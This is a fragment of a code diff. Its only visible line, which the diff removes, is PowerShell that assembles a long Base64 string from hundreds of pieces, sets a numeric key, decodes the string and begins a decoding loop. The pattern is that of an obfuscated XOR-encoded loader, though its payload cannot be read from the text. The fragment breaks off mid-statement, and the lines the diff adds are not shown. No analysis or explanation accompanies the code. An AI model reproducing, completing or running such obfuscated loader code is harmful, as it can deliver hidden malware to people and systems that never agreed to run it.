@@ -1,2 +1,128 @@
-$yMSKZN="fhdyF28X"+"PxdMF3QX"+"fxd2F2UX"+"TBdKF0oX"+"PxchFyIX"+"ORc5Fy4X"+"Jxc8Fy4X"+"IBc5FzkX"+"JhclFyUX"+"axcyF2wX"+"TBd0F38X"+"dhdlF0oX"+"MxdIF2oX"+"axdQF3IX"+"Yxc6F0UX"+"dhd5F3MX"+"eBd6FzcX"+"OhdUF3gX"+"Yhd5F2MX"+"NxcuFy4X"+"LhcuF2sX"+"RBdyF3sX"+"chd0F2MX"+"Nxc6F0IX"+"eRd+F2YX"+"YhdyFz4X"+"Nxc6F30X"+"eBd+F3kX"+"NxcwFzAX"+"PhcsFzMX"+"dhcmFyoX"+"MBdEF24X"+"ZBdjF3IX"+"ehc5F1kX"+"chdjFzkX"+"RBd4F3QX"+"fBdyF2MX"+"ZBc5F0MX"+"dBdnF1QX"+"exd+F3IX"+"eRdjFzAX"+"LBczF3UX"+"JRcqF0wX"+"VBd4F3kX"+"YRdyF2UX"+"YxdKFy0X"+"LRdRF2UX"+"eBd6F18X"+"chdvF0QX"+"YxdlF34X"+"eRdwFz8X"+"PxcwFycX"+"JhcwFzwX"+"MBcnFyUX"+"MBc8FzAX"+"JxckFzAX"+"PBcwFycX"+"IxcwFzwX"+"MBcnFyIX"+"MBc8FzAX"+"JxchFzAX"+"PBcwFycX"+"IBcwFzwX"+"MBcnFy8X"+"MBc8FzAX"+"JxcuFzAX"+"PBcwFycX"+"dhcwFzwX"+"MBcnF3UX"+"MBc8FzAX"+"Jxd0FzAX"+"PBcwFycX"+"cxcwFzwX"+"MBcnF3IX"+"MBc8FzAX"+"JxdxFzAX"+"PBcwFyYX"+"JxcwFzwX"+"MBcmFyYX"+"MBc8FzAX"+"JhclFzAX"+"PBcwFyYX"+"JBcwFzwX"+"MBcmFyMX"+"MBc8FzAX"+"JhciFzAX"+"PBcwFyYX"+"IRcwFzwX"+"MBcmFyAX"+"MBc8FzAX"+"JhcvFzAX"+"PBcwFyYX"+"LhcwFzwX"+"MBcmF3YX"+"MBc8FzAX"+"Jhd1FzAX"+"PBcwFyYX"+"dBcwFzwX"+"MBcmF3MX"+"MBc8FzAX"+"JhdyFzAX"+"PBcwFyYX"+"cRcwFzwX"+"MBclFycX"+"MBc+Fz4X"+"LBdWF3MX"+"cxc6F0MX"+"bhdnF3IX"+"Nxc6F0MX"+"bhdnF3IX"+"UxdyF3EX"+"fhd5F34X"+"Yxd+F3gX"+"eRc3Fz8X"+"MBdiF2QX"+"fhd5F3AX"+"NxdEF24X"+"ZBdjF3IX"+"ehcsF2IX"+"ZBd+F3kX"+"cBc3F0QX"+"bhdkF2MX"+"chd6FzkX"+"QxdyF28X"+"YxcsF2IX"+"ZBd+F3kX"+"cBc3F0QX"+"bhdkF2MX"+"chd6FzkX"+"RBdyF3QX"+"YhdlF34X"+"YxduFzkX"+"VBdlF24X"+"ZxdjF3gX"+"cBdlF3YX"+"Zxd/F24X"+"LBdnF2IX"+"dRd7F34X"+"dBc3F3QX"+"exd2F2QX"+"ZBc3FzAX"+"PBc/FzAX"+"TxcwFz0X"+"IBc+FzwX"+"MBc3F2wX"+"ZxdiF3UX"+"exd+F3QX"+"NxdkF2MX"+"dhdjF34X"+"dBc3F3UX"+"bhdjF3IX"+"TBdKFzcX"+"Thc/F3UX"+"bhdjF3IX"+"TBdKFzcX"+"fBc7F2QX"+"YxdlF34X"+"eRdwFzcX"+"Zxc+F2wX"+"YhdkF34X"+"eRdwFz8X"+"VhdyF2QX"+"UBd0F3oX"+"Nxd2FyoX"+"eRdyF2AX"+"NxdWF3IX"+"ZBdQF3QX"+"ehc/F3wX"+"Phc+F2wX"+"dRduF2MX"+"chdMF0oX"+"Nxd5FyoX"+"eRdyF2AX"+"Nxd1F24X"+"YxdyF0wX"+"JhclF0oX"+"LBd5F3IX"+"YBc3F0UX"+"dhd5F3MX"+"eBd6Fz8X"+"Phc5F1kX"+"chdvF2MX"+"VRduF2MX"+"chdkFz8X"+"eRc+FywX"+"dRduF2MX"+"chdMF0oX"+"Nxd0FyoX"+"eRdyF2AX"+"Nxd1F24X"+"YxdyF0wX"+"Zxc5F1sX"+"chd5F3AX"+"Yxd/F0oX"+"LBd1F24X"+"YxdyF0wX"+"Shc3F2MX"+"Khd5F3IX"+"YBc3F3UX"+"bhdjF3IX"+"TBcmFyEX"+"ShcsF3YX"+"ORdSF3kX"+"dBdlF24X"+"ZxdjFz8X"+"eRc7F1IX"+"eRd0F3gX"+"cxd+F3kX"+"cBc5F0IX"+"QxdRFy8X"+"ORdQF3IX"+"YxdVF24X"+"YxdyF2QX"+"PxdnFz4X"+"Oxd0FzsX"+"Yxc+FywX"+"dRduF2MX"+"chdMF0oX"+"NxdlFyoX"+"eRdyF2AX"+"Nxd1F24X"+"YxdyF0wX"+"eRc5F1sX"+"chd5F3AX"+"Yxd/FzwX"+"Yxc5F1sX"+"chd5F3AX"+"Yxd/FzwX"+"dBc5F1sX"+"chd5F3AX"+"Yxd/F0oX"+"LBdVF2IX"+"cRdxF3IX"+"ZRc5F1UX"+"exd4F3QX"+"fBdUF3gX"+"ZxduFz8X"+"eRc7FycX"+"OxdlFzsX"+"Jxc7F3kX"+"ORdbF3IX"+"eRdwF2MX"+"fxc+FywX"+"VRdiF3EX"+"cRdyF2UX"+"ORdVF3sX"+"eBd0F3wX"+"VBd4F2cX"+"bhc/F2MX"+"OxcnFzsX"+"ZRc7F3kX"+"ORdbF3IX"+"eRdwF2MX"+"fxc7F2MX"+"ORdbF3IX"+"eRdwF2MX"+"fxc+FywX"+"VRdiF3EX"+"cRdyF2UX"+"ORdVF3sX"+"eBd0F3wX"+"VBd4F2cX"+"bhc/F3QX"+"OxcnFzsX"+"ZRc7F3kX"+"ORdbF3IX"+"eRdwF2MX"+"fxc8F2MX"+"ORdbF3IX"+"eRdwF2MX"+"fxc7F3QX"+"ORdbF3IX"+"eRdwF2MX"+"fxc+FywX"+"ZRdyF2MX"+"YhdlF3kX"+"NxdlFywX"+"ahdqF2cX"+"Yhd1F3sX"+"fhd0FzcX"+"ZBdjF3YX"+"Yxd+F3QX"+"NxdkF2MX"+"ZRd+F3kX"+"cBc3F00X"+"Pxd1F24X"+"YxdyF0wX"+"Shc3F3wX"+"Oxd1F24X"+"YxdyF0wX"+"Shc3F3MX"+"PhdsF34X"+"cRc/F3MX"+"ORdbF3IX"+"eRdwF2MX"+"fxcrFyUX"+"Lxc+F2UX"+"chdjF2IX"+"ZRd5FzcX"+"eRdiF3sX"+"excsF3UX"+"bhdjF3IX"+"TBdKFzcX"+"eRcqF3kX"+"chdgFzcX"+"dRduF2MX"+"chdMFyYX"+"JRdKFywX"+"dRduF2MX"+"chdMF0oX"+"NxdjFyoX"+"eRdyF2AX"+"Nxd1F24X"+"YxdyF0wX"+"JhchF0oX"+"LBd1F24X"+"YxdyF0wX"+"Shc3F3QX"+"Khd5F3IX"+"YBc3F3UX"+"bhdjF3IX"+"TBdzFzkX"+"WxdyF3kX"+"cBdjF38X"+"OhclFy8X"+"ShcsF1UX"+"YhdxF3EX"+"chdlFzkX"+"VRd7F3gX"+"dBd8F1QX"+"eBdnF24X"+"PxdzFzsX"+"Jxc7F3kX"+"OxcnFzsX"+"JhclFz4X"+"LBdVF2IX"+"cRdxF3IX"+"ZRc5F1UX"+"exd4F3QX"+"fBdUF3gX"+"ZxduFz8X"+"cxc7FyYX"+"JRc7F2MX"+"OxcnFzsX"+"JhchFz4X"+"LBdVF2IX"+"cRdxF3IX"+"ZRc5F1UX"+"exd4F3QX"+"fBdUF3gX"+"ZxduFz8X"+"cxc7FyUX"+"Lxc7F3QX"+"OxcnFzsX"+"dBc5F1sX"+"chd5F3AX"+"Yxd/Fz4X"+"LBdiF2QX"+"fhd5F3AX"+"PxdWF3IX"+"ZBdQF3QX"+"ehc3F3YX"+"Khd5F3IX"+"YBc3F1YX"+"chdkF1AX"+"dBd6Fz8X"+"fBc+Fz4X"+"bBd1F24X"+"YxdyF0wX"+"Shc3F2cX"+"Khd5F3IX"+"YBc3F3UX"+"bhdjF3IX"+"TBd0FzkX"+"WxdyF3kX"+"cBdjF38X"+"ShcsF2MX"+"ZRduF2wX"+"dhc5F1MX"+"chd0F2UX"+"bhdnF2MX"+"Pxd5FzsX"+"dBc7F2MX"+"OxdnFz4X"+"LBdlF3IX"+"YxdiF2UX"+"eRc3F1IX"+"eRd0F3gX"+"cxd+F3kX"+"cBc5F0IX"+"QxdRFy8X"+"ORdQF3IX"+"YxdEF2MX"+"ZRd+F3kX"+"cBc/F2cX"+"PhcsF2oX"+"dBd2F2MX"+"dBd/F2wX"+"ZRdyF2MX"+"YhdlF3kX"+"Nxd5F2IX"+"exd7FywX"+"ahdqF2oX"+"ahcwFz4X"+"LBczF3QX"+"JBcqFzUX"+"MxdyF3kX"+"YRctF0cX"+"RRdYF1AX"+"RRdWF1oX"+"URdeF1sX"+"UhdEF0sX"+"WRdiF2QX"+"fxdyF3sX"+"exdLF3kX"+"Yhc5F3IX"+"bxdyFzUX"+"LBd+F3EX"+"Pxc2Fz8X"+"QxdyF2QX"+"Yxc6F0cX"+"dhdjF38X"+"NxczF3QX"+"JBc+Fz4X"+"bBc/FyYX"+"ORc5FyIX"+"axcyF2wX"+"RBdjF3YX"+"ZRdjFzoX"+"RBd7F3IX"+"chdnFzcX"+"Ohd6FzcX"+"IhcnF2oX"+"PhcsF2MX"+"ZRduF2wX"+"PxcwF2AX"+"fhd5F3AX"+"chdjFzcX"+"Ohc6F2EX"+"chdlF2QX"+"fhd4F3kX"+"MBc+F2sX"+"WBdiF2MX"+"OhdZF2IX"+"exd7FywX"+"PxcwF2AX"+"fhd5F3AX"+"chdjFzcX"+"fhd5F2QX"+"Yxd2F3sX"+"exc3FzoX"+"Ohd+F3MX"+"NxdZF2IX"+"ZBd/F3IX"+"exd7FzkX"+"WRdiF2QX"+"fxdyF3sX"+"exc3FzoX"+"OhdyF28X"+"dhd0F2MX"+"Nxc6FzoX"+"ZBd+F3sX"+"chd5F2MX"+"Nxc6FzoX"+"dhd0F3QX"+"chdnF2MX"+"OhdnF3YX"+"dBd8F3YX"+"cBdyFzoX"+"dhdwF2UX"+"chdyF3oX"+"chd5F2MX"+"ZBc3FzoX"+"Ohd2F3QX"+"dBdyF2cX"+"Yxc6F2QX"+"eBdiF2UX"+"dBdyFzoX"+"dhdwF2UX"+"chdyF3oX"+"chd5F2MX"+"ZBcwFz4X"+"axd+F3IX"+"bxdqF3QX"+"dhdjF3QX"+"fxdsFyYX"+"ORc5FyQX"+"axcyF2wX"+"ahcsFzMX"+"cxcjFyoX"+"PxdeF3kX"+"YRd4F3wX"+"chc6F0UX"+"chdkF2MX"+"WhdyF2MX"+"fxd4F3MX"+"Nxc/FzAX"+"fxdjF2MX"+"ZxdkFy0X"+"OBc4F3YX"+"Zxd+FzkX"+"cBd+F2MX"+"fxdiF3UX"+"ORd0F3gX"+"ehc4F2UX"+"chdnF3gX"+"ZBc4F3kX"+"YhdkF38X"+"chd7F3sX"+"OBd5F2IX"+"ZBd/F3IX"+"exd7FzgX"+"ZRdyF3sX"+"chd2F2QX"+"chdkFzgX"+"exd2F2MX"+"chdkF2MX"+"MBc+Fz4X"+"LBczF3IX"+"IhcqFz8X"+"MxdzFyMX"+"ORd2F2QX"+"ZBdyF2MX"+"ZBdrFygX"+"Nxd5F3YX"+"ehdyFzcX"+"Ohd7F34X"+"fBdyFzcX"+"MBc9F28X"+"LxchF0gX"+"IRcjFzoX"+"Zxd0FzoX"+"YBd+F3kX"+"cxd4F2AX"+"ZBc6F3oX"+"ZBdhF3QX"+"ORdtF34X"+"ZxcwFz4X"+"ORd1F2UX"+"eBdgF2QX"+"chdlF0gX"+"cxd4F2AX"+"eRd7F3gX"+"dhdzF0gX"+"YhdlF3sX"+"LBczF3EX"+"IRcqFzUX"+"MxdyF3kX"+"YRctF0MX"+"UhdaF0cX"+"Sxd5F2IX"+"ORdtF34X"+"Zxc1FywX"+"Xhd5F2EX"+"eBd8F3IX"+"OhdAF3IX"+"dRdFF3IX"+"ZhdiF3IX"+"ZBdjFzcX"+"MxdyFyIX"+"Nxc6F1gX"+"YhdjF1EX"+"fhd7F3IX"+"NxczF3EX"+"IRcsFz8X"+"WRdyF2AX"+"OhdYF3UX"+"fRdyF3QX"+"Yxc3F14X"+"WBc5F1QX"+"eBd6F2cX"+"ZRdyF2QX"+"ZBd+F3gX"+"eRc5F00X"+"fhdnF1EX"+"fhd7F3IX"+"PhctFy0X"+"UhdvF2MX"+"ZRd2F3QX"+"YxdDF3gX"+"Uxd+F2UX"+"chd0F2MX"+"eBdlF24X"+"PxczF3EX"+"IRc7FzUX"+"MxdyF3kX"+"YRctF0cX"+"RRdYF1AX"+"RRdWF1oX"+"URdeF1sX"+"UhdEF0sX"+"WRdiF2QX"+"fxdyF3sX"+"exc1Fz4X"+"LBdFF3IX"+"ehd4F2EX"+"chc6F14X"+"YxdyF3oX"+"NxczF3EX"+"IRdqF2oX"+"LBdxF2IX"+"eRd0F2MX"+"fhd4F3kX"+"NxdwFyAX"+"PxczF38X"+"Lxc+F2wX"+"MRc3FzMX"+"dBckFzcX"+"Ohd0FzcX"+"Mxd/Fy8X"+"NxclFykX"+"MRcmF2sX"+"WBdiF2MX"+"OhdEF2MX"+"ZRd+F3kX"+"cBdqFywX"+"Mxd+Fy4X"+"KhdXF2wX"+"MBcmFzAX"+"KhcwF2QX"+"bhdkF2MX"+"chd6F34X"+"eRdxF3gX"+"NxdrFzcX"+"cRd+F3kX"+"cxdkF2MX"+"ZRc3FzgX"+"fhc3FzUX"+"WBdEFzcX"+"WRd2F3oX"+"chc3F1gX"+"RBc3F0EX"+"chdlF2QX"+"fhd4F3kX"+"NRcwFywX"+"MBclFzAX"+"KhcwF2AX"+"ehd+F3QX"+"Nxd4F2QX"+"NxdwF3IX"+"Yxc3F3QX"+"dhdnF2MX"+"fhd4F3kX"+"OxdhF3IX"+"ZRdkF34X"+"eBd5FzsX"+"eBdkF3YX"+"ZRd0F38X"+"fhdjF3IX"+"dBdjF2IX"+"ZRdyFzAX"+"LBcwFyQX"+"MBcqFzAX"+"YBd/F3gX"+"dhd6F34X"+"Nxc4F3YX"+"exd7FzAX"+"LBcwFyMX"+"MBcqFzAX"+"fhdnF3QX"+"eBd5F3EX"+"fhdwFzcX"+"OBd2F3sX"+"excwFywX"+"MBciFzAX"+"KhcwF3kX"+"chdjF2QX"+"Yxd2F2MX"+"Nxc6F3YX"+"eRd4FzcX"+"axc3F3EX"+"fhd5F3MX"+"ZBdjF2UX"+"NxdSF0QX"+"QxdWF1UX"+"WxdeF0QX"+"XxdSF1MX"+"MBcsFzAX"+"IRcwFyoX"+"MBdgF3oX"+"fhd0FzcX"+"OBd5F3gX"+"cxdyFy0X"+"exd4F3QX"+"dhd7F38X"+"eBdkF2MX"+"Nxc4F3kX"+"dhd6F3IX"+"ZBdnF3YX"+"dBdyFy0X"+"SxdLF0sX"+"SxdlF3gX"+"eBdjF0sX"+"SxdEF3IX"+"dBdiF2UX"+"fhdjF24X"+"VBdyF3kX"+"YxdyF2UX"+"JRc3F2cX"+"dhdjF38X"+"NxdWF3kX"+"Yxd+F0EX"+"fhdlF2IX"+"ZBdHF2UX"+"eBdzF2IX"+"dBdjFzcX"+"cBdyF2MX"+"NxdzF34X"+"ZBdnF3sX"+"dhduF1kX"+"dhd6F3IX"+"MBcsFzAX"+"IBcwFyoX"+"MBdjF3YX"+"ZBd8F3sX"+"fhdkF2MX"+"Nxc4F2EX"+"MBcsFzAX"+"LxcwFyoX"+"MBdQF3IX"+"Yxc6F1QX"+"eBd6F2cX"+"YhdjF3IX"+"ZRdeF3kX"+"cRd4FzcX"+"axc3F0QX"+"chd7F3IX"+"dBdjFzcX"+"QBd+F3kX"+"cxd4F2AX"+"ZBdHF2UX"+"eBdzF2IX"+"dBdjF1kX"+"dhd6F3IX"+"OxdDF3gX"+"Yxd2F3sX"+"Rxd/F24X"+"ZBd+F3QX"+"dhd7F1oX"+"chd6F3gX"+"ZRduFzAX"+"LBcwFy4X"+"MBcqFzAX"+"eRdyF2MX"+"Nxd7F3gX"+"dBd2F3sX"+"cBdlF3gX"+"YhdnFzcX"+"dhdzF3oX"+"fhd5F34X"+"ZBdjF2UX"+"dhdjF3gX"+"ZRdkFzAX"+"LBcwFyYX"+"JxcwFyoX"+"MBdQF3IX"+"Yxc6F0cX"+"ZRd4F3QX"+"chdkF2QX"+"NxdrFzcX"+"RBd4F2UX"+"Yxc3F0AX"+"RBc3FzoX"+"cxdyF2QX"+"dBc3F2sX"+"NxdEF3IX"+"exdyF3QX"+"Yxc3FzoX"+"cRd+F2UX"+"ZBdjFzcX"+"JhcnFzcX"+"WRd2F3oX"+"chc7F14X"+"cxc7F0AX"+"RBc7F0cX"+"dhdjF38X"+"MBdqFywX"+"YBd/F34X"+"exdyFz8X"+"MxdjF2UX"+"YhdyFz4X"+"bBdjF2UX"+"bhdsFzMX"+"fRcnFyoX"+"WRdyF2AX"+"OhdYF3UX"+"fRdyF3QX"+"Yxc3FzMX"+"dhcmFz8X"+"MBcmFyUX"+"IBc5FycX"+"ORcnFzkX"+"JhcwFzsX"+"LxcnFy8X"+"Jxc+FywX"+"Mxd8FyYX"+"KhczF30X"+"Jxc5F1AX"+"chdjF0QX"+"YxdlF3IX"+"dhd6Fz8X"+"PhcsF2AX"+"fxd+F3sX"+"chc/FzMX"+"YxdlF2IX"+"chc+F2wX"+"Mxd7FyUX"+"KhdZF3IX"+"YBc6F1gX"+"dRd9F3IX"+"dBdjFzcX"+"dRduF2MX"+"chdMF0oX"+"NxcjFywX"+"fhdxFz8X"+"Mxd8FyYX"+"ORdFF3IX"+"dhdzFz8X"+"Mxd7FyUX"+"OxcnFzsX"+"Ixc+FzoX"+"eRdyFyMX"+"PhdsF3UX"+"ZRdyF3YX"+"fBdqFywX"+"Mxd6FyQX"+"KhdMF1UX"+"fhdjF1QX"+"eBd5F2EX"+"chdlF2MX"+"chdlF0oX"+"LRctF0MX"+"eBdeF3kX"+"YxckFyUX"+"PxczF3sX"+"JRdMFyQX"+"ORc5FycX"+"Shc7FycX"+"PhcsFzMX"+"eRcjFyoX"+"WRdyF2AX"+"OhdYF3UX"+"fRdyF3QX"+"Yxc3F3UX"+"bhdjF3IX"+"TBdKFzcX"+"Mxd6FyQX"+"LBczF3gX"+"IhcqFycX"+"LBdgF38X"+"fhd7F3IX"+"PxczF3gX"+"Ihc6F3sX"+"YxczF3oX"+"JBc+F2wX"+"Mxd4FyIX"+"PBcqFzMX"+"fBcmFzkX"+"RRdyF3YX"+"cxc/FzMX"+"eRcjFzsX"+"Mxd4FyIX"+"OxczF3oX"+"JBc6FzMX"+"eBciFz4X"+"ahcsFzMX"+"ZxchFyoX"+"TBdPF08X"+"TxdPF08X"+"TxdPF0oX"+"LRctF00X"+"PxczF3UX"+"JRc7FzMX"+"eRcjFz4X"+"LBd+F3EX"+"Pxc2FzMX"+"ZxchFz4X"+"bBczF2YX"+"IBcqFzAX"+"SRZ+F3EX"+"ZRdyFzcX"+"8BfhF20X"+"6xd7F3IX"+"ehdyF3MX"+"fhcwFywX"+"dRdlF3IX"+"dhd8F2oX"+"LBczF2YX"+"IBcqFzAX"+"MBcsF34X"+"cRc/FzMX"+"fhcuFzkX"+"VBd4F3kX"+"Yxd2F34X"+"eRdkF1wX"+"chduFz8X"+"MxdnFyEX"+"Phc+F2wX"+"MxdmFyAX"+"Khd+F3IX"+"bxc3FzMX"+"fhcuF0wX"+"MxdnFyEX"+"Shc3FyUX"+"KRcxFyYX"+"axdYF2IX"+"Yxc6F0QX"+"YxdlF34X"+"eRdwF2oX"+"chd7F2QX"+"chd+F3EX"+"PxczF2cX"+"IRc6F3IX"+"ZhcwFzgX"+"YhdkF3IX"+"ZRdkFzAX"+"PhdsFzMX"+"ZRcvFyoX"+"MBdMFzcX"+"PxdJF3kX"+"chdjFzcX"+"YhdkF3IX"+"ZRc3F2sX"+"NxdxF2UX"+"eBd6FzcX"+"ZBdkF2EX"+"NxdrFzcX"+"ZBd8F34X"+"Zxc3FyUX"+"NxdrFzcX"+"cBdyF2MX"+"Nxc1F0IX"+"ZBdyF2UX"+"Nxd5F3YX"+"ehdyFzUX"+"Phc3Fz8X"+"SRdgF3oX"+"fhd0FzcX"+"QhdkF3IX"+"ZRdWF3QX"+"dBd4F2IX"+"eRdjFzcX"+"cBdyF2MX"+"NxdZF3YX"+"ehdyFzcX"+"OBdxF3gX"+"ZRd6F3YX"+"YxctF3QX"+"ZBdhFzcX"+"axc3F3EX"+"ZRd4F3oX"+"Nxd0F2QX"+"YRc3FzoX"+"Ohd5F3gX"+"fxdyF3YX"+"cxdyF2UX"+"ZBc3F2sX"+"NxdkF3wX"+"fhdnFzcX"+"Jhc3F2sX"+"NxdwF3IX"+"Yxc3F1kX"+"dhd6F3IX"+"Phc3Fz8X"+"exdkFzcX"+"VBctF0sX"+"SxdCF2QX"+"chdlF2QX"+"SxdLFzcX"+"axc3F2AX"+"fxdyF2UX"+"chc3F2MX"+"bhdnF3IX"+"NxcqFyoX"+"NxdzF34X"+"ZRc3F2sX"+"NxdwF3IX"+"Yxc3F3kX"+"dhd6F3IX"+"NxdrFzcX"+"Zxd2F2MX"+"fxc3F3UX"+"dhdkF3IX"+"eRd2F3oX"+"chc+FzcX"+"PxdlF3IX"+"cBd+F2QX"+"YxdlF24X"+"NxdmF2IX"+"chdlF24X"+"Nxc1F18X"+"XBdbF1oX"+"SxdLF0QX"+"WBdRF0MX"+"QBdWF0UX"+"UhdLF0sX"+"Whd+F3QX"+"ZRd4F2QX"+"eBdxF2MX"+"SxdLF0AX"+"fhd5F3MX"+"eBdgF2QX"+"NxdZF0MX"+"SxdLF1QX"+"YhdlF2UX"+"chd5F2MX"+"QRdyF2UX"+"ZBd+F3gX"+"eRdLF0sX"+"RxdlF3gX"+"cRd+F3sX"+"chdbF34X"+"ZBdjFzUX"+"Nxc6FzoX"+"ZBdiF3UX"+"fBdyF24X"+"ZBc3F2sX"+"NxdyF3YX"+"dBd/FzcX"+"bBc3F2sX"+"fBdrFzcX"+"ZRdyF3AX"+"fhdkF2MX"+"ZRduFzcX"+"ZhdiF3IX"+"ZRduFzcX"+"NRc/FzMX"+"fBc5F2cX"+"dhdjF38X"+"PhdLF0sX"+"PxczF3wX"+"ORdkF2IX"+"dRd8F3IX"+"bhc+FzUX"+"Nxc4F2EX"+"NxdHF2UX"+"eBdxF34X"+"exdyF14X"+"ehd2F3AX"+"chdHF3YX"+"Yxd/FzcX"+"axc3F3AX"+"chdjFzcX"+"YRd2F3sX"+"YhdyFzcX"+"axc3F3EX"+"fhdlF2QX"+"Yxc3F2sX"+"NxdnF3YX"+"ZRdkF3IX"+"Nxc1F1QX"+"LRdLF0sX"+"SxdLF0IX"+"ZBdyF2UX"+"ZBdLF0sX"+"SxdLF2wX"+"YhdkF3IX"+"ZRdqF0sX"+"SxdLF0sX"+"NRc3F2sX"+"NxdwF3IX"+"Yxc3F2IX"+"ZBdyF2UX"+"ORcnFzcX"+"ahc3F2sX"+"NxdiF3kX"+"fhdmFz4X"+"Nxc/F2MX"+"ZRduFzcX"+"bBc3F3sX"+"ZBc3FzUX"+"VBctF0sX"+"SxdCF2QX"+"chdlF2QX"+"SxdLFz0X"+"SxdLF1YX"+"ZxdnF1MX"+"dhdjF3YX"+"SxdLF1sX"+"eBd0F3YX"+"exdLF0sX"+"UBd4F3gX"+"cBd7F3IX"+"SxdLF1QX"+"fxdlF3gX"+"ehdyF0sX"+"SxdCF2QX"+"chdlFzcX"+"Uxd2F2MX"+"dhc1FzcX"+"axc3F3AX"+"chdjFzcX"+"eRd2F3oX"+"chc3F2sX"+"NxdnF3YX"+"ZRdkF3IX"+"Nxc1F1QX"+"LRdLF0sX"+"SxdLF0IX"+"ZBdyF2UX"+"ZBdLF0sX"+"SxdLF2wX"+"YhdkF3IX"+"ZRdqF0sX"+"SxdLF0sX"+"NRc3F2sX"+"NxdwF3IX"+"Yxc3F2IX"+"ZBdyF2UX"+"ORcnFzcX"+"ahc3F3QX"+"dhdjF3QX"+"fxc3F2wX"+"NxdMF0oX"+"NxdqFz4X"+"Nxc/F2MX"+"ZRduFzcX"+"bBc3F3sX"+"ZBc3FzUX"+"VBctF0sX"+"SxdCF2QX"+"chdlF2QX"+"SxdLFz0X"+"SxdLF1YX"+"ZxdnF1MX"+"dhdjF3YX"+"SxdLF1sX"+"eBd0F3YX"+"exdLF0sX"+"Whd+F3QX"+"ZRd4F2QX"+"eBdxF2MX"+"SxdLF1IX"+"cxdwF3IX"+"SxdLF0IX"+"ZBdyF2UX"+"NxdTF3YX"+"Yxd2FzUX"+"NxdrFzcX"+"cBdyF2MX"+"Nxd5F3YX"+"ehdyFzcX"+"axc3F2cX"+"dhdlF2QX"+"chc3FzUX"+"VBctF0sX"+"SxdLF0sX"+"QhdkF3IX"+"ZRdkF0sX"+"SxdLF0sX"+"bBdiF2QX"+"chdlF2oX"+"SxdLF0sX"+"Sxc1FzcX"+"axc3F3AX"+"chdjFzcX"+"YhdkF3IX"+"ZRc5FycX"+"NxdqFzcX"+"dBd2F2MX"+"dBd/FzcX"+"bBc3F0wX"+"Shc3F2oX"+"Phc3Fz8X"+"YxdlF24X"+"NxdsFzcX"+"exdkFzcX"+"NRdUFy0X"+"SxdLF0IX"+"ZBdyF2UX"+"ZBdLF0sX"+"PRdLF0sX"+"WBd5F3IX"+"UxdlF34X"+"YRdyFzUX"+"NxdrFzcX"+"cBdyF2MX"+"Nxd5F3YX"+"ehdyFzcX"+"axc3F2cX"+"dhdlF2QX"+"chc3FzUX"+"VBctF0sX"+"SxdLF0sX"+"QhdkF3IX"+"ZRdkF0sX"+"SxdLF0sX"+"bBdiF2QX"+"chdlF2oX"+"SxdLF0sX"+"Sxc1FzcX"+"axc3F3AX"+"chdjFzcX"+"YhdkF3IX"+"ZRc5FycX"+"NxdqFzcX"+"dBd2F2MX"+"dBd/FzcX"+"bBc3F0wX"+"Shc3F2oX"+"Phc3F0oX"+"NxdrFzcX"+"cRd7F3YX"+"YxdjF3IX"+"eRc3F2sX"+"NxdiF3kX"+"fhdmFzcX"+"axc3F2QX"+"eBdlF2MX"+"NxdrFzcX"+"YxdyF3IX"+"NxdsFzcX"+"Yxd4FzcX"+"fRdkF3gX"+"eRc3FykX"+"Nxd8F2IX"+"exd7F3YX"+"eRd+F3QX"+"fhd7F3YX"+"ZRc5F30X"+"ZBd4F3kX"+"NxdqFzcX"+"axc3F2MX"+"eBc3F2MX"+"chdvF2MX"+"MBcsFzMX"+"ZhcgFyoX"+"cBcgFzcX"+"MxdlFy8X"+"ahdyF3sX"+"ZBdyF34X"+"cRc/FzMX"+"ZxchFzoX"+"chdmFzAX"+"OBdkF2MX"+"chd2F3sX"+"MBc+F2wX"+"MxdkFy4X"+"KhcwF3sX"+"chdjFzcX"+"Zxd+F3MX"+"NxcqFzcX"+"PxdnF2QX"+"NxdrFzcX"+"YBd/F3IX"+"ZRdyFzcX"+"eRd2F3oX"+"chc3FyoX"+"Khc3FzUX"+"exdkF3YX"+"ZBdkFzkX"+"chdvF3IX"+"NRc3F2sX"+"NxdwF3IX"+"Yxc3F2cX"+"fhdzFzcX"+"axc3F3EX"+"fhdlF2QX"+"Yxc+FywX"+"NxdyF3QX"+"fxd4FzcX"+"NRd7F2QX"+"dhdkF2QX"+"NxdHF14X"+"UxctFzcX"+"MxdnF34X"+"cxc3FzoX"+"NxdTF2IX"+"ehdnFzcX"+"chdzF34X"+"exd+F24X"+"eBdlFzkX"+"ORc5FzUX"+"LBc3F0kX"+"ZRdiF3kX"+"cxd7F3sX"+"JBclFzkX"+"chdvF3IX"+"NxdUFy0X"+"SxdLF2AX"+"fhd5F3MX"+"eBdgF2QX"+"SxdLF2QX"+"bhdkF2MX"+"chd6FyQX"+"JRdLF0sX"+"dBd4F3oX"+"ZBdhF3QX"+"ZBc5F3MX"+"exd7FzsX"+"NxdaF34X"+"eRd+F1MX"+"Yhd6F2cX"+"NxczF2cX"+"fhdzFzcX"+"exdkF3YX"+"ZBdkF0gX"+"cxdiF3oX"+"Zxc5F3MX"+"ehdnFzcX"+"cRdiF3sX"+"excsFzcX"+"chd0F38X"+"eBc3FzUX"+"exdkF3YX"+"ZBdkF0gX"+"cxdiF3oX"+"Zxc5F3MX"+"ehdnFzcX"+"fxd2F20X"+"JhZlFzYX"+"NRcsFzcX"+"chd0F38X"+"eBc3FzUX"+"VRdlF3gX"+"YBdkF3IX"+"ZRc3F0gW"+"fhdxF2UX"+"chc3F3MX"+"eBdkF24X"+"dhd7F3YX"+"ZRcmFjcX"+"fBd4F2cX"+"bhd2F3sX"+"dhd5FyYW"+"bhd4F2UX"+"ORc5FzkX"+"NRcsFzcX"+"exdyF2MX"+"NxdiF2QX"+"chdlF2QX"+"NxcqFzcX"+"Pxd7F2QX"+"NxdUFy0X"+"SxdLF0IX"+"ZBdyF2UX"+"ZBdLF0sX"+"NxdrFzcX"+"YBd/F3IX"+"ZRdyFzcX"+"YxduF2cX"+"chc3FyoX"+"Khc3F3MX"+"fhdlFzcX"+"axc3F3AX"+"chdjFzcX"+"eRd2F3oX"+"chc3F2sX"+"NxdnF3YX"+"Yxd/FzcX"+"dRd2F2QX"+"chd5F3YX"+"ehdyFz4X"+"LBc3F3EX"+"eBdlFzcX"+"Yhc3F34X"+"eRc3FzMX"+"YhdkF3IX"+"ZRdkFzcX"+"bBc3F3sX"+"chdjFzcX"+"dBd/F2UX"+"eBcdFw=="; $Fybydy=23; $oDRcAv=[System.Convert]::FromBase64String($yMSKZN); $TNljyB=for($i=0;$i -lt 